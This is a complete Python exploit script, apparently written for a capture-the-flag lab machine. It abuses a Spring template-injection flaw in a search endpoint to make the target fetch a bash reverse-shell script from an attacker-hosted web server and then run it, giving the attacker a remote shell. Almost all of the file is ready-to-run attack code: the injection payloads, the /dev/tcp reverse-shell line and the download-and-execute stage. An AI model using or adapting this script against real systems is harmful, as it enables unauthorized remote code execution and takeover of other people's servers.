# Creator: brutuspt

import requests
import argparse
import urllib.parse
import os, sys
import base64
import socket
import time
from bs4 import BeautifulSoup

# web server
import http.server
import socketserver
import threading

parser = argparse.ArgumentParser(description='Process some integers.')
parser.add_argument("-t", "--target", help="Target Domain Name/IP", required=True)
parser.add_argument("-i", "--IP", help="Attacker IP (Where to catch the rev shell)", required=True)
parser.add_argument("-p", "--port", help="Attacker Port (Where to catch the rev shell)", required=True)
parser.add_argument("-w", "--webport", help="Port responsible for running the webserver", required=True)

args = parser.parse_args()

s = requests.Session()

def create_server():    
    handler = http.server.SimpleHTTPRequestHandler
    httpd = socketserver.TCPServer((args.IP, int(args.webport)), handler)
    print("[INFO] Starting the payload hosting server at: http://%s:%s" % (args.IP, args.webport))  
    httpd.serve_forever()


def payload_writing(target, ip, port):
    print("[INFO] Trying to build the payload file...")
    
    f = open("rev.sh", "w")
    f.write("/bin/bash -l > /dev/tcp/"+str(ip)+"/"+str(port)+ " 0<&1 2>&1")
    f.close()
    print("[SUCCESS] Reverse shell payload created!")

    threading.Thread(target=create_server).start()


def exploit_SSTI(target, ip, webport):
    # There is an SSTI vulnerabitiy on the search engine

    #proxies = { "http" : "127.0.0.1:8080" }
    headers = { 
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Referer": "http://10.10.11.170:8080/stats?author=woodenk"
     }
    url = "http://%s:8080/search" % target

    # start to host the payload
    

    #1 stage - download the payload    
    payload = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('wget http://"+str(ip)+":"+str(webport)+"/rev.sh').getInputStream())}"
    data = { "name" : str(payload)}

    r = s.post(url, data=data, headers=headers) # proxies=proxies
    if r.status_code == 200:
        print("[SUCCESS] 1st stage completed...The payload was downloaded into the target machine")
    else:
        print("[ERROR] Something failed, check the payload or proxy logs...")
        sys.exit(1)
    
    #2 stage - Execute the payload on target    
    payload = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('bash rev.sh').getInputStream())}"
    data = { "name" : str(payload)}

    print("[SUCCESS] 2nd stage completed. Executing the reverse shell!! Check your listener ;)")
    r = s.post(url, data=data, headers=headers) # proxies=proxies
    

def main():
    payload_writing(args.target, args.IP, args.port)
    exploit_SSTI(args.target, args.IP, args.webport)


if __name__ == "__main__":
    main()